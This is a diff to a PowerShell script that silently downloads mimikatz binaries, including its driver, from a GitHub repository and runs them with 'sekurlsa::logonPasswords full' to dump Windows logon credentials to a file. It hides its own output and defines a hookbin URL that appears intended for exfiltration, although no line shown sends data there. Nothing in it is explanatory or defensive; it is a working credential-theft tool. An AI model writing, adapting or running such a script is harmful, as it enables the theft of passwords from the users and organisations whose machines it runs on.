@@ -1,19 +1,23 @@
-Add-Type -assembly "system.io.compression.filesystem"
+#Add-Type -assembly "system.io.compression.filesystem"
 Add-Type -AssemblyName System.Web
 
 $uri_hookbin = "https://hookb.in/ZV8Od8Bd"
 $repo_path = "$HOME/Desktop/ok"
 mkdir $repo_path > $null 2>&1
+mkdir $mimikatz_path > $null 2>&1
 $mimikatz_zip_path = "$repo_path/mimikatz.zip"
 $mimikatz_path = "$repo_path/mimikatz"
 
 # Downloading And extracting mimikatz
-(new-object System.net.WebClient).DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.zip", $mimikatz_zip_path) > $null 2>&1 
-[io.compression.zipfile]::ExtractToDirectory($mimikatz_zip_path, $mimikatz_path) > $null 2>&1 
+#(new-object System.net.WebClient).DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.zip", $mimikatz_path/) > $null 2>&1 
+(new-object System.net.WebClient).DownloadFile("https://github.com/projetcybersecurite/ok/blob/master/mimikatz.exe?raw=true", $mimikatz_path/mimikatz.exe) > $null 2>&1 
+(new-object System.net.WebClient).DownloadFile("https://github.com/projetcybersecurite/ok/blob/master/mimilib.dll?raw=true", $mimikatz_path/mimilib.dll) > $null 2>&1 
+(new-object System.net.WebClient).DownloadFile("https://github.com/projetcybersecurite/ok/blob/master/mimidrv.sys?raw=true", $mimikatz_path/mimidrv.sys) > $null 2>&1 
+#[io.compression.zipfile]::ExtractToDirectory($mimikatz_zip_path, $mimikatz_path) > $null 2>&1 
 
 # Executing
 cd $repo_path
-mimikatz/x64/mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit" > ./output_mimikatz 
+mimikatz/mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit" > ./output_mimikatz 
 echo "DONE"
 echo -n "Mimikat output is:"
 cat ./output_mimikatz
